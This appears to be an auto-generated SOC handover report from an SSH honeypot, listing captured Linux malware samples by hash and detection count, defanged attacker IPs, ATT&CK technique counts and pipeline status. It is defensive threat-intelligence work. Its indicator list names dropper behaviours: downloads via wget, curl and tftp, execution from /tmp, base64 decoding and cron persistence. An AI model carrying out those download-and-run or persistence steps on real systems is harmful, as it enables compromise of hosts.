| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39` | ELF Binary (Linux executable) (RISC-V 64-bit) | `3f3bf218089d1488...` | 33/100 | 🟢 LOW | **8/75** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `23.254.222[.]201` | US | RackNerd LLC | **100** ⚠️ | 0 |
| `203.129.225[.]4` | IN | Software Technology Parks of India | **100** ⚠️ | 50 |
| `171.231.191[.]101` | VN | Viettel Group | **100** ⚠️ | 32 |
| `34.122.244[.]225` | US | Google LLC | **100** ⚠️ | 3 |
| `92.5.66[.]49` | DE | Oracle Svenska AB | **100** ⚠️ | 4 |
| `218.21.243[.]58` | CN | InnerMongoliaWuhaiGongWuSu109JiaYouZhan | **100** ⚠️ | 50 |
| `194.165.16[.]164` | LT | Flyservers S.A. | **100** ⚠️ | 50 |
| `45.79.207[.]111` | US | Linode | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 5 |
| `106.75.9[.]241` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 135 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 123 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 33 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 32 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 31 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 332 cases |
| Tool 34  | Credential Extractor        | ✅ 170 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 138 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 26 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 122 priority case(s) shown individually · 42 recon entry/entries in table (20 group(s) consolidating 155 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-31T10:44:28Z_
